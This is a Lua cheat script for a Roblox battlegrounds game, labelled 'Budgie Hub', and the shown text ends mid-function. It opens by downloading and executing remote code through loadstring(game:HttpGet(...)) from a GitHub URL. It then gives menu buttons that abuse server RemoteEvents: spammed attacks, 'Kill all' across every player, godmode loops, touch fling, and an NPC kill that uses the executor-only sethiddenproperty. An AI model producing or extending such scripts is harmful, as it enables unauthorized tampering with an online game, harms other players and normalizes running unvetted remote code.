local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/ionlyusegithubformcmods/1-Line-Scripts/main/Mobile%20Friendly%20Orion')))()

local Window = OrionLib:MakeWindow({Name = "Budgie Hub | AnM battlegrounds", HidePremium = true, IntroEnabled = false, SaveConfig = false, ConfigFolder = "OrionTest"})

local Tab = Window:MakeTab({
	Name = "Characters",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local Section = Tab:AddSection({
	Name = "Gojo"
})

Tab:AddButton({
 Name = "Super Red",
 Callback = function()
        for i = 1, 10 do
game:GetService("ReplicatedStorage").Remotes.Red:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Technique Pull",
 Callback = function()
        game:GetService("Players").LocalPlayer.Backpack["Technique Pull"].ao.Event:FireServer()
   end    
})
Tab:AddButton({
 Name = "Spam Lapse Blue",
 Callback = function()
        for i = 1, 20 do
wait()
game:GetService("Players").LocalPlayer.Backpack["Lapse Blue"].Move1.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "One Six Eyes",
 Callback = function()
        game:GetService("Players").LocalPlayer.Backpack["One Six Eyes"].Script.Event:FireServer()
   end    
})

Tab:AddLabel("Gear 2")

Tab:AddButton({
 Name = "Maximum Red",
 Callback = function()
        for i = 1, 5 do
game:GetService("Players").LocalPlayer.Backpack["Maximum Reversal Red"].Red.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Ultimate Red",
 Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Backpack.Red.Script.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Maximum Blue",
 Callback = function()
        game:GetService("ReplicatedStorage").Remotes.Blue:FireServer()
   end    
})

Tab:AddButton({
 Name = "Purple",
 Callback = function()
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Purple"):FireServer()
   end    
})

Tab:AddButton({
 Name = "Unlimited Void 0,2",
 Callback = function()
        game:GetService("Players").LocalPlayer.Backpack["Unlimited Void 0,2s"].Domain.Event:FireServer()
   end    
})

Tab:AddButton({
 Name = "Infinity Void",
 Callback = function()
        game:GetService("Players").LocalPlayer.Backpack["Infinity Void"].Skill.InfinityVoid:FireServer()
   end    
})

Tab:AddButton({
 Name = "Six Eyes",
 Callback = function()
        game:GetService("Players").LocalPlayer.Backpack["Six Eyes"].Script.Event:FireServer()
   end    
})

Tab:AddLabel("Gear 3")

Tab:AddButton({
 Name = "Powerful Black Flash",
 Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Backpack["Black Flash"].BlackFlash.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Unlimited Void",
 Callback = function()
game:GetService("Players").LocalPlayer.Backpack["Unlimited Void"].Skill.InfinityVoid:FireServer()
   end    
})

Tab:AddButton({
 Name = "200% Purple",
 Callback = function()
        game:GetService("Players").LocalPlayer.Backpack["Maximum Hollow Purple"].Skill.Event:FireServer()
   end    
})

Tab:AddButton({
 Name = "Nuke Purple",
 Callback = function()
        local ohString1 = "FinalHollowPurple"

game:GetService("ReplicatedStorage").Events.Abilitys.Gojo:FireServer(ohString1)
   end    
})


local Section = Tab:AddSection({
	Name = "Sukuma"
})

Tab:AddButton({
 Name = "Powerful Cursed Barrage",
 Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Backpack["Cursed Barrage"].LocalScript.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Powerful Black Slash",
 Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Backpack["Black Flash"].BlackFlash.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Powerful Slaughter Demon",
 Callback = function()
        for i = 1, 25 do
game:GetService("Players").LocalPlayer.Backpack["Slaughter Demon"].LocalScript.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Powerful Kick Manji",
 Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Backpack["Manji Kick"].Kick.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Boxing Arena",
 Callback = function()
        game:GetService("Players").LocalPlayer.Backpack["Boxing Arena"].Skill.RingOfDeath:FireServer()
   end    
})

Tab:AddButton({
 Name = "Activate ult",
 Callback = function()
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("KingofCurses"):FireServer()
   end    
})

Tab:AddLabel("Ult version")

Tab:AddButton({
 Name = "Powerful Cleave",
 Callback = function()
        for i = 1, 20 do
game:GetService("Players").LocalPlayer.Backpack.Cleave.LocalScript.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Powerful Dismantle",
 Callback = function()
        for i = 1, 50 do
game:GetService("Players").LocalPlayer.Backpack.Dismantle.LocalScript.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Multi Fire",
 Callback = function()
        game:GetService("ReplicatedStorage"):WaitForChild("Assets"):WaitForChild("Remtoes"):WaitForChild("Fire"):FireServer()
   end    
})

Tab:AddButton({
 Name = "Multi regen",
 Callback = function()
 game:GetService("Players").LocalPlayer.Backpack["Reversed Cursed Technique"].Script.Event:FireServer()
   end    
})

Tab:AddButton({
 Name = "Domain",
 Callback = function()
        game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("MalevolentShrine"):FireServer()
   end    
})

local Section = Tab:AddSection({
	Name = "Toji"
})

Tab:AddButton({
 Name = "Super Punches",
 Callback = function()
        for i = 1, 10 do
game:GetService("ReplicatedStorage").Remotes.Punches:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Powerful PlayfulCould",
 Callback = function()
        for i = 1, 10 do
game:GetService("ReplicatedStorage").Remotes.PlayfulCloud:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Incredible Vanishing",
 Callback = function()
        for i = 1, 20 do
game:GetService("ReplicatedStorage").Remotes.Vanishing:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Activate Ult",
 Callback = function()
game:GetService("Players").LocalPlayer.Backpack["Inverted Spear Of Heaven"].Script.Event:FireServer()
   end    
})

Tab:AddLabel("Ult version")

Tab:AddButton({
 Name = "Powerful Ground Strike",
 Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Backpack["Through out Earth"].Script.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Powerful Throat Slit",
 Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Backpack["Throat Slit"].LocalScript.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Powerful Little Hand",
 Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Backpack["Little Hand"].Combo.Event:FireServer()
end
   end    
})

local Section = Tab:AddSection({
	Name = "Saitama"
})

Tab:AddButton({
 Name = "Fast Powerful Blows",
 Callback = function()
        for i = 1, 10 do
wait()
game:GetService("Players").LocalPlayer.Backpack["Consecutive Normal Punches"].Punch.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Powerful Normal Punch",
 Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Backpack["Normal Punch"].Punch.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Mega Shove",
 Callback = function()
        for i = 1, 40 do
game:GetService("Players").LocalPlayer.Backpack.Shove.Punch.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Really Serious Punch",
 Callback = function()
        for i = 1, 5 do
game:GetService("Players").LocalPlayer.Backpack["Serious Punch"].Punch.Event:FireServer()
end
   end    
})

local Section = Tab:AddSection({
	Name = "Luffy"
})

Tab:AddButton({
 Name = "Long Punch",
 Callback = function()
        for i = 1, 25 do
game:GetService("Players").LocalPlayer.Backpack.Pistol.Move.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Double Punch",
 Callback = function()
        
   end    
})

Tab:AddButton({
 Name = "Leg Kick",
 Callback = function()
        for i = 1, 8 do
game:GetService("Players").LocalPlayer.Backpack["Battle Axe"].Move.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Consecutive Strikes",
 Callback = function()
        for i = 1, 10 do
game:GetService("ReplicatedStorage").barrage.barrage:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Gear 2 Activate",
 Callback = function()
        game:GetService("Players").LocalPlayer.Backpack["Gear 2"].Script.Event:FireServer()
   end    
})

Tab:AddLabel("Gear 2 Version")

Tab:AddButton({
 Name = "Powerful Long Punch",
 Callback = function()
        for i = 1, 30 do
game:GetService("Players").LocalPlayer.Backpack.Jet.Move.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Powerful Double Punch",
 Callback = function()
        for i = 1, 30 do
game:GetService("Players").LocalPlayer.Backpack["Jet Missile"].Move.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Powerful Leg Kick",
 Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Backpack["Battle Axe"].Move.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Powerful Consecutive Strikes",
 Callback = function()
        for i = 1, 5 do
game:GetService("ReplicatedStorage").barrage.jetbarrage:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Gear 1 Activate",
 Callback = function()
        game:GetService("Players").LocalPlayer.Backpack["Gear 1"].Script.Event:FireServer()
   end    
})

local Section = Tab:AddSection({
	Name = "Hakari"
})

Tab:AddButton({
	Name = "Powerful ball",
	Callback = function()
      		for i = 1, 20 do
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Pachinko"):FireServer()
end
  	end    
})

Tab:AddButton({
	Name = "To cut in half",
	Callback = function()
      		for i = 1, 15 do
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("ShutterDoors"):FireServer()
end
  	end    
})

Tab:AddButton({
	Name = "Powerful beating",
	Callback = function()
      		for i = 1, 10 do
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("LuckyBeatdown"):FireServer()
end
  	end    
})

Tab:AddButton({
 Name = "Powerful Projectile",
 Callback = function()
        wait(1.5)
for i = 1, 10 do
local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

local targetPosition = mouse.Hit.Position
local ohCFrame1 = CFrame.new(targetPosition)
local ohVector32 = Vector3.new(targetPosition.X, targetPosition.Y, targetPosition.Z)

game:GetService("ReplicatedStorage").Remotes.PachinkoBall:FireServer(ohCFrame1, ohVector32)
end
   end    
})

Tab:AddButton({
	Name = "Transformation",
	Callback = function()
      		game:GetService("ReplicatedStorage"):WaitForChild("Domainthing"):FireServer()
  	end    
})

Tab:AddButton({
	Name = "Spawn containers",
	Callback = function()
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("ContainerKick"):FireServer()
	end    
})

local Section = Tab:AddSection({
	Name = "Sakuya"
})

Tab:AddButton({
 Name = "Spam knife throw",
 Callback = function()
        while true do
 wait()
game:GetService("Players").LocalPlayer.Character:FindFirstChild("Knife Throw").Knife.Fire:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Spam knife burst",
 Callback = function()
        while true do
 wait()
game:GetService("Players").LocalPlayer.Character:FindFirstChild("Knives Burst").Knife.Fire:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Spam knife wall",
 Callback = function()
        while true do
  wait(0.2)
game:GetService("Players").LocalPlayer.Character:FindFirstChild("Sense of Thrown Edge").Knife.Fire:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Powerful wound sign",
 Callback = function()
        for i = 1, 30 do
game:GetService("Players").LocalPlayer.Backpack["Wound Sign"].Script.Event:FireServer()
end
   end    
})

local Section = Tab:AddSection({
	Name = "Gyutaro"
})

Tab:AddButton({
 Name = "Powerful Circular Slashes",
 Callback = function()
        for i = 1, 50 do
game:GetService("Players").LocalPlayer.Backpack["Circual Slashes"].Punch.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Powerful Rampant Rampage",
 Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Backpack["Rampant Rampage"].Punch.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Projectile",
 Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Backpack["Rampant Arc"].Keybind.Fire:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Sequential Projectiles",
 Callback = function()
        for i = 1, 100 do
wait()
game:GetService("Players").LocalPlayer.Backpack["Rampant Arc"].Keybind.Fire:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Tool Spam Projectiles",
 Callback = function()
        repeat
  game:GetService("RunService").RenderStepped:Wait()
 if game:GetService("Players").LocalPlayer.Character:FindFirstChild("Rampant Arc") then
game:GetService("Players").LocalPlayer.Character:FindFirstChild("Rampant Arc").Keybind.Fire:FireServer()
  end
until game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0
   end    
})

Tab:AddButton({
 Name = "Danger Murder",
 Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Backpack["Rampant Rampage"].Punch.Event:FireServer()
end
wait(0.3)
game:GetService("ReplicatedStorage"):FindFirstChild("AfterImageEvent"):FireServer()
   end    
})

local Section = Tab:AddSection({
	Name = "Kenjaku(OP Character)"
})

Tab:AddButton({
 Name = "Powerful squid cursed",
 Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Character:FindFirstChild("Squid Curse").Move1.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Spam mini utzumaki(OP)",
 Callback = function()
 
 local LP = game.Players.LocalPlayer
repeat wait() until LP.Character
for i,v in pairs(LP.Backpack:GetChildren()) do
   if v.Name == "Mini Uzumaki" then
       v.Parent = LP.Character
   end
end
 
        while true do
 wait(0.2)
local mouse = game:GetService("Players").LocalPlayer:GetMouse()
local clickPosition = mouse.Hit.Position

local args = {
    [1] = CFrame.new(clickPosition),
    [2] = 1000000
}

game:GetService("Players").LocalPlayer.Character:FindFirstChild("Mini Uzumaki").FireServer.RemoteEvent:FireServer(unpack(args))
end
   end    
})

Tab:AddButton({
 Name = "Kill all with mini utzumaki(OP)",
 Callback = function()
 
 local LP = game.Players.LocalPlayer
repeat wait() until LP.Character
for i,v in pairs(LP.Backpack:GetChildren()) do
   if v.Name == "Mini Uzumaki" then
       v.Parent = LP.Character
   end
end
 
        local players = game:GetService("Players"):GetPlayers()

for _, player in ipairs(players) do
    if player.Character then
        local args = {
            [1] = player.Character.HumanoidRootPart.CFrame,
            [2] = math.huge
        }

        game:GetService("Players").LocalPlayer.Character:FindFirstChild("Mini Uzumaki").FireServer.RemoteEvent:FireServer(unpack(args))
    end
end
   end    
})

Tab:AddButton({
 Name = "Powerful maximum utzumaki",
 Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Character:FindFirstChild("Maximum Uzumaki").Move1.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Real maximum utzumaki",
 Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Character:FindFirstChild("Supreme Art: Maximum Uzumaki").Move1.Event:FireServer()
end
   end    
})

local Section = Tab:AddSection({
	Name = "Ichigo lorde"
})

Tab:AddButton({
 Name = "Cry from the heart",
 Callback = function()
        for i = 1, 20 do
game:GetService("Players").LocalPlayer.Backpack.Scream.LocalScript.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Incinerate",
 Callback = function()
        for i = 1, 15 do
game:GetService("Players").LocalPlayer.Backpack.Cero.LocalScript.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Shadow Dash",
 Callback = function()
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Vanish"):FireServer()
   end    
})

Tab:AddButton({
 Name = "Hollow Mask",
 Callback = function()
        game:GetService("Players").LocalPlayer.Backpack["Hollow Mask"].HollowMask.Remote:FireServer()
   end    
})

Tab:AddButton({
 Name = "Repeat Abilities",
 Callback = function()
        repeat wait()
 if game:GetService("Players").LocalPlayer.Character:FindFirstChild("Grab Cero") then
game:GetService("Players").LocalPlayer.Character:FindFirstChild("Grab Cero").LocalScript.Event:FireServer()
 end
until game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0
   end    
})

Tab:AddButton({
 Name = "Sudden Grab",
 Callback = function()
        game:GetService("ReplicatedStorage"):FindFirstChild("AfterImageEvent"):FireServer()
task.wait()
game:GetService("Players").LocalPlayer.Backpack["Grab Cero"].LocalScript.Event:FireServer()
   end    
})

local Section = Tab:AddSection({
	Name = "Ayanokoji (Half OP Character)"
})

Tab:AddLabel("The character sucks, but you can become immortal")
Tab:AddLabel("But you won't be able to use the tools")

Tab:AddDropdown({
	Name = "Repeat abilities",
	Default = "",
	Options = {"Repeat Grap", "Repeat Head Beatdown", "Repeat Grap Slam", "Off all abilities"},
	Callback = function(Value)
		if Value == "Repeat Grap" then
local WsE = true
		local function toolOdin()
repeat wait()
if game:GetService("Players").LocalPlayer.Character:FindFirstChild("Grab") then
    game:GetService("Players").LocalPlayer.Character.Grab.LocalScript.Event:FireServer()
end
until game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0 or WsE == false
end

toolOdin()
		end
		if Value == "Repeat Head Beatdown" then
local WsE = true
		local function toolTri()
repeat wait()
if game:GetService("Players").LocalPlayer.Character:FindFirstChild("Head Beatdown") then
    game:GetService("Players").LocalPlayer.Character:FindFirstChild("Head Beatdown").LocalScript.Event:FireServer()
end
until game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0 or WsE == false
end

toolTri()
		end
		if Value == "Repeat Grap Slam" then
local WsE = true
		local function toolDva()
repeat wait()
if game:GetService("Players").LocalPlayer.Character:FindFirstChild("Grab Slam") then
    game:GetService("Players").LocalPlayer.Character:FindFirstChild("Grab Slam").LocalScript.Event:FireServer()
end
until game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0 or WsE == false
end

toolDva()
		end
		if Value == "Off all abilities" then
	local WsE = false
		end
	end    
})

Tab:AddButton({
 Name = "Godmode",
 Callback = function()
local args = {
    [1] = "Ayanokoji"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))
   wait(0.3)
repeat
   wait()
   local LP = game.Players.LocalPlayer
repeat wait() until LP.Character
for i,v in pairs(LP.Backpack:GetChildren()) do
   if v.Name == "Dodge" then
       v.Parent = LP.Character
   end
end
game:GetService("Players").LocalPlayer.Character.Dodge.Skill.Event:FireServer()
until game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0
 end    
})

Tab:AddButton({
 Name = "Godmode v2",
 Callback = function()
        local LP = game.Players.LocalPlayer

local function EquipDodge()
    repeat task.wait()
        if not LP.Character then
            continue
        end
        
        for i,v in pairs(LP.Backpack:GetChildren()) do
            if v.Name == "Dodge" then
               v.Parent = LP.Character
               game:GetService("Players").LocalPlayer.Character.Dodge.Skill.Event:FireServer()
for i, v in pairs(LP.Character:GetChildren()) do
        if v:IsA("Tool") then
            v:Activate()
        end
    end
               break
            end
        end
    until LP.Character and game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0
end

repeat task.wait()
    EquipDodge()
until game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0
   end    
})

local Section = Tab:AddSection({
	Name = "Manjiro"
})

Tab:AddButton({
	Name = "Powerful Under kick",
	Callback = function()
      		for i = 1, 30 do
game:GetService("Players").LocalPlayer.Backpack["Under Kick"].LocalScript.Event:FireServer()
end
  	end    
})

Tab:AddButton({
 Name = "Powerful KickSlam",
 Callback = function()
        for i = 1, 10 do
game:GetService("ReplicatedStorage").Remotes.KickSlam:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Strongest Strike",
 Callback = function()
        for i = 1, 15 do
game:GetService("Players").LocalPlayer.Backpack["Strongest Kick"].BlackFlash.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Shadow Rush",
 Callback = function()
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Vanish"):FireServer()
   end    
})

Tab:AddButton({
 Name = "Serious Aura",
 Callback = function()
        for i = 1, 15 do
game:GetService("Players").LocalPlayer.Backpack["Dark Impulse"]["Full Cowl"].Event:FireServer()
end
   end    
})

Tab:AddDropdown({
	Name = "Leg Mastery",
	Default = "1",
	Options = {"Suddenness", "Ultra instinct", "Series of Strikes"},
	Callback = function(Value)
		if Value == "Suddenness" then
		for i = 1, 15 do
game:GetService("Players").LocalPlayer.Backpack["Strongest Kick"].BlackFlash.Event:FireServer()
end
wait(0.7)
game:GetService("ReplicatedStorage"):FindFirstChild("AfterImageEvent"):FireServer()
		end
		if Value == "Ultra instinct" then
count = 0
	repeat wait(0.8)
	count = count + 1
		for i = 1, 15 do
game:GetService("Players").LocalPlayer.Backpack["Strongest Kick"].BlackFlash.Event:FireServer()
end
wait(0.7)
game:GetService("ReplicatedStorage"):FindFirstChild("AfterImageEvent"):FireServer()
until count == 5
		end
		if Value == "Series of Strikes" then
count = 0
last_pick_sin_mrazy = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
	repeat wait(0.2)
  count = count + 1
	game:GetService("ReplicatedStorage"):FindFirstChild("AfterImageEvent"):FireServer()
	task.wait(0.1)
	for i = 1, 30 do
game:GetService("Players").LocalPlayer.Backpack["Under Kick"].LocalScript.Event:FireServer()
end
	until count == 10
wait()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = last_pick_sin_mrazy
		end
	end    
})

local Tab = Window:MakeTab({
	Name = "Options",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab:AddButton({
 Name = "Anti purple shot",
 Callback = function()
        local player = game:GetService("Players").LocalPlayer
while task.wait() do
local parts = workspace:GetPartBoundsInRadius(player.Character:WaitForChild("HumanoidRootPart").Position, 10)
for _, part in ipairs(parts) do
part.CanTouch = fasle
end
end
   end    
})

Tab:AddButton({
	Name = "Anti slow",
	Callback = function()
	repeat wait()
local Player = game.Players.LocalPlayer
local Character = Player.Character or Player.CharacterAdded:Wait()

local initialSpeed = 16
local currentSpeed = Character.Humanoid.WalkSpeed

if currentSpeed >= 0 and currentSpeed <= 10 then
    Character.Humanoid.WalkSpeed = initialSpeed
else
    Character.Humanoid.WalkSpeed = currentSpeed
end
until game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0
	end    
})

Tab:AddButton({
	Name = "Anti inventory lock",
	Callback = function()
      while true do
 task.wait()
  local StarterGui = game:GetService("StarterGui")
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)

local sgui = game:GetService("StarterGui")
sgui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
end
	end    
})

Tab:AddDropdown({
	Name = "Input Character",
	Default = "1",
	Options = {
		"Gojo Young", "Yuji / Sukuna", "Toji", "Denji", "Goku Black", "Muichiro", "Akaza", "Zenitsu", 
		"Tanjiro Sun", "Rengoku", "Garou", "Giyu", "Saitama", "Gyutaro", "Sakuya", "Gojo", "Goku Ultra", 
		"Zoro", "Yuta", "Luffy", "Shadow", "Kenjaku", "Vergil", "Megumi / Sukuna", "Green Hero", 
		"Asta Demon", "Hakari", "Ichigo Vasto Lorde", "Ayanokoji", "Manjiro", "Ichigo"
	},
	Callback = function(Value)
		local args = { Value }
		game:GetService("ReplicatedStorage").Picked:FireServer(unpack(args))
	end
})


Tab:AddToggle({
	Name = "Godmode",
	Default = false,
	Callback = function(Value)
	God = Value
		while God do
		wait(0.2)
		if game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 150 or game:GetService("Players").LocalPlayer.Character.Humanoid.Health < 150 then
	game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("KingofCurses"):FireServer()
end
		end
	end    
})

Tab:AddButton({
 Name = "Anti Void",
 Callback = function()
        local part = Instance.new("Part")
part.Name = "AntiFallPart"
part.Size = Vector3.new(50000, 5, 50000)
part.Transparency = 1
part.Anchored = true
part.Position = Vector3.new(8, -47, -92)
part.Parent = game.Workspace

local part = Instance.new("Part")
part.Name = "AntiFallPart2"
part.Size = Vector3.new(50000, 5, 50000)
part.Transparency = 0.5
part.Anchored = true
part.Position = Vector3.new(8, -94, -92)
part.Parent = game.Workspace
   end    
})

Tab:AddButton({
 Name = "Anti jump block",
 Callback = function()
        while true do
  wait()
local Player = game.Players.LocalPlayer
local Character = Player.Character or Player.CharacterAdded:Wait()
Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, true)

local initialJump = 50
local currentJump = Character.Humanoid.JumpPower

if currentJump >= 0 and currentJump <= 10 then
    Character.Humanoid.JumpPower = initialJump
else
    Character.Humanoid.JumpPower = currentJump
end
 end
   end    
})

Tab:AddButton({
 Name = "Anti reclining",
 Callback = function()
        local plr = game.Players.LocalPlayer
local char = plr.Character
  for _, child in pairs(char:GetChildren()) do
    if child:IsA("BasePart") then
      child.Massless = false
      child.CustomPhysicalProperties = PhysicalProperties.new(math.huge, math.huge, math.huge) 
    end
  end
   end    
})

Tab:AddButton({
 Name = "Anti reclining v2",
 Callback = function()
        while true do
   task.wait()
speaker = game.Players.LocalPlayer
for i,v in pairs(speaker.Character:GetDescendants()) do
  if v:IsA("BodyVelocity") or v:IsA("BodyGyro") or v:IsA("RocketPropulsion") or v:IsA("BodyThrust") or v:IsA("BodyAngularVelocity") or v:IsA("AngularVelocity") or v:IsA("BodyForce") or v:IsA("VectorForce") or v:IsA("LineForce") then
   v:Destroy()
  end
 end
end
   end    
})

Tab:AddButton({
 Name = "Kill all NPCs",
 Callback = function()
        sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", 112412400000)
sethiddenproperty(game.Players.LocalPlayer, "MaxSimulationRadius", 112412400000)
for i, d in pairs(game.Workspace:GetDescendants()) do
    if d.ClassName == 'Humanoid' and not game.Players:FindFirstChild(d.Parent.Name) then
        d.Health = 0
    end
end
   end    
})

Tab:AddButton({
 Name = "Anti collision",
 Callback = function()
local Services = setmetatable({}, {__index = function(Self, Index)
    local NewService = game:GetService(Index)
    if NewService then
        Self[Index] = NewService
    end
    return NewService
end})

local LocalPlayer = Services.Players.LocalPlayer

local function PlayerAdded(Player)
    local Character
    local PrimaryPart

    local function CharacterAdded(newCharacter)
        Character = newCharacter
        repeat
            wait()
            PrimaryPart = newCharacter:FindFirstChild("HumanoidRootPart")
        until PrimaryPart
    end

    Player.CharacterAdded:Connect(CharacterAdded)
    if Player.Character then
        CharacterAdded(Player.Character)
    end

    Services.RunService.Heartbeat:Connect(function()
        if Character and Character:IsDescendantOf(workspace) and PrimaryPart and PrimaryPart:IsDescendantOf(Character) then
            if PrimaryPart.AssemblyAngularVelocity.Magnitude > 0 or PrimaryPart.AssemblyLinearVelocity.Magnitude > 0 then
                for _, v in ipairs(Character:GetDescendants()) do
                    if v:IsA("BasePart") then
                        v.CanCollide = false
                        v.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                        v.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                        v.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
                    end
                end
                PrimaryPart.CanCollide = false
                PrimaryPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                PrimaryPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                PrimaryPart.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
            end
        end
    end)
end

local function OnPlayerAdded(player)
    if player ~= LocalPlayer then
        PlayerAdded(player)
    end
end

for _, player in ipairs(Services.Players:GetPlayers()) do
    OnPlayerAdded(player)
end

Services.Players.PlayerAdded:Connect(OnPlayerAdded)
   end    
})

Tab:AddButton({
    Name = "Touch fling",
    Callback = function()
local function startFling()
            local hrp, c, vel, movel = nil, nil, nil, 0.1
            local player = game.Players.LocalPlayer

            while player and player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health > 0 and hiddenfling do
                game:GetService("RunService").Heartbeat:Wait()

                local lp = player
                while hiddenfling and not (c and c.Parent and hrp and hrp.Parent) do
                    game:GetService("RunService").Heartbeat:Wait()
                    c = lp.Character
                    hrp = c:FindFirstChild("HumanoidRootPart") or c:FindFirstChild("Torso") or c:FindFirstChild("UpperTorso")
                end

                if hiddenfling then
                    vel = hrp.Velocity
                    hrp.Velocity = vel * 10000 + Vector3.new(0, 100000, 0)
                    game:GetService("RunService").RenderStepped:Wait()

                    if c and c.Parent and hrp and hrp.Parent then
                        hrp.Velocity = vel
                    end

                    game:GetService("RunService").Stepped:Wait()

                    if c and c.Parent and hrp and hrp.Parent then
                        hrp.Velocity = vel + Vector3.new(0, movel, 0)
                        movel = movel * -1
                    end
                end
            end
        end

        if game:GetService("ReplicatedStorage"):FindFirstChild("juisdfj0i32i0eidsuf0iok") then
            hiddenfling = true
        else
            hiddenfling = true
            local detection = Instance.new("Decal")
            detection.Name = "juisdfj0i32i0eidsuf0iok"
            detection.Parent = game:GetService("ReplicatedStorage")
        end

        startFling()
end
})

Tab:AddButton({
 Name = "Equip all tools",
 Callback = function()
        for _, tool in ipairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
     if tool:IsA("Tool") then
          tool.Parent = game:GetService("Players").LocalPlayer.Character
     end
 end
   end    
})

Tab:AddButton({
 Name = "Delete all tools",
 Callback = function()
        local Player = game:GetService("Players").LocalPlayer
local Backpack = Player.Backpack
local Character = Player.Character

for _,v in pairs(Backpack:GetChildren()) do
   if v:IsA("Tool") or v:IsA("HopperBin") then
       v:Destroy()
   end
end

for _,v in pairs(Character:GetChildren()) do
   if v:IsA("Tool") or v:IsA("HopperBin") then
       v:Destroy()
   end 
end
   end    
})

Tab:AddButton({
 Name = "Fix Camera",
 Callback = function()
        speaker = game.Players.LocalPlayer
workspace.CurrentCamera:remove()
 task.wait()
 repeat wait() until speaker.Character ~= nil
 workspace.CurrentCamera.CameraSubject = speaker.Character:FindFirstChildWhichIsA('Humanoid')
